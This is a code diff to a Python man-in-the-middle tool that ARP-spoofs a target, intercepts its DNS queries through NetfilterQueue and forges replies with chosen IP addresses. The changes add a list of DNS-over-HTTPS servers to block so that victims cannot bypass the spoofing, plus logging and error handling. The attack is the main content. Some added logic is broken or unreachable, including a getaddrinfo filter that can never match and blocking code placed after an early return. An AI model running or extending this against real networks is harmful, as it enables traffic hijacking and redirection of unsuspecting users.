@@ -1,6 +1,7 @@
 import socket
 import os
 import scapy.all as scapy
+from scapy.layers.tls.all import TLSApplicationData
 import argparse
 import errno
 import sys
@@ -8,6 +9,31 @@ import ipaddress
 from netfilterqueue import NetfilterQueue
 import multiprocessing as mp
 import json
+
+# block all encrypted traffic to these endpoints.
+def get_doh_blocked_servers():
+    hostnames = [
+        "cloudflare-dns.com",
+        "mozilla.cloudflare-dns.com",
+        "dns.google",
+        "dns.quad9.net",
+        "dns9.quad9.net",
+        "dns10.quad9.net",
+        "dns11.quad9.net"
+    ]
+
+    res = []
+
+    for host in hostnames:
+        for resp in socket.getaddrinfo(host, 22, type=socket.SOCK_STREAM):
+            if resp[0] is socket.AddressFamily.AF_INET and resp[1] is socket.SocketKind.SOCK_RAW:
+                res.append(resp[4][0])
+
+    return res
+
+# DOH_BLOCKED_SERVERS = get_doh_blocked_servers()
+
+# print(DOH_BLOCKED_SERVERS)
 
 def get_mac(ip_addr, interface):
     eth_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
@@ -30,8 +56,8 @@ def arp_cleanup(target_ip, gateway_ip, target_mac, gateway_mac, interface):
     print("> Cleaning up ARP spoofing", flush=True)
     
     print("> Re-ARPping target and gateway", flush=True)
-    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), iface = interface, count = 7)
-    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), iface = interface, count = 7)
+    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), iface = interface, count = 10)
+    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), iface = interface, count = 10)
 
     print("> Disabling IP forwarding", flush=True)
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -114,30 +140,55 @@ class PacketHandler():
         return ip / udp / dns
     
     def get_dns_entry(self, hostname):
-        return socket.gethostbyname(hostname)
+        try:
+            return socket.gethostbyname(hostname)
+        except:
+            return None
     
     def handle_dns(self, packet):
         qname = packet[scapy.DNSQR].qname
 
+        if len(qname) > 4 and qname[-5:] == 'lan.':
+            return
+
         if self.spoof_all:
             scapy.send(self.make_dns(packet, self.spoof_map), iface=self.interface)
-            print(f'> Intercepted DNS request. Modified host IP to {self.spoof_map}')
+            print(f'> Intercepted DNS request to {qname.decode("utf-8")} Modified host IP to {self.spoof_map}')
             return
 
         if len(self.spoof_map) == 0:
             ip = self.get_dns_entry(qname)
+
+            if ip is None:
+                return
+
             scapy.send(self.make_dns(packet, ip), iface=self.interface)
-            print('> Intercepted DNS request. Did not modify host IP')
             return
 
         if qname not in self.spoof_map:
             ip = self.get_dns_entry(qname)
-            print('> Intercepted DNS request. Did not modify host IP')
+
+            if ip is None:
+                return
         else:
             ip = self.spoof_map[qname]
-            print(f'> Intercepted DNS request. Modified host IP to {ip}')
+            print(f'> Intercepted DNS request to {qname.decode("utf-8")} Modified host IP to {ip}')
         
         scapy.send(self.make_dns(packet, ip), iface=self.interface)
+
+    def handle_tcp(self, packet):
+        if not packet.haslayer(TLSApplicationData):
+            return True
+        
+        return True
+        
+        server_ip = packet[scapy.IP].dst
+
+        if server_ip in DOH_BLOCKED_SERVERS:
+            print(server_ip)
+            return False
+        else:
+            return True
 
     def handle_packet(self, pkt):
         packet = scapy.IP(pkt.get_payload())
@@ -145,8 +196,11 @@ class PacketHandler():
         if packet.haslayer(scapy.UDP):
             self.handle_udp(packet)
             return
-        
-        pkt.accept()
+        elif packet.haslayer(scapy.TCP):
+            if self.handle_tcp(packet):
+                pkt.accept()
+        else:
+            pkt.accept()
        
 
 def mitm_proxy(interface, target_ip, spoof_map):
@@ -154,10 +208,12 @@ def mitm_proxy(interface, target_ip, spoof_map):
     packet_handler = PacketHandler(interface, target_ip, spoof_map)
     nfqueue.bind(1, packet_handler.handle_packet)
 
+    print("> NFQueue binded. Packet manipulation starting")
+
     try:
         nfqueue.run()
     except KeyboardInterrupt:
-        print('')
+        print('> Closing MITM proxy')
     nfqueue.unbind()
                 
 def init_ip_tables(target_ip, nf_queue):
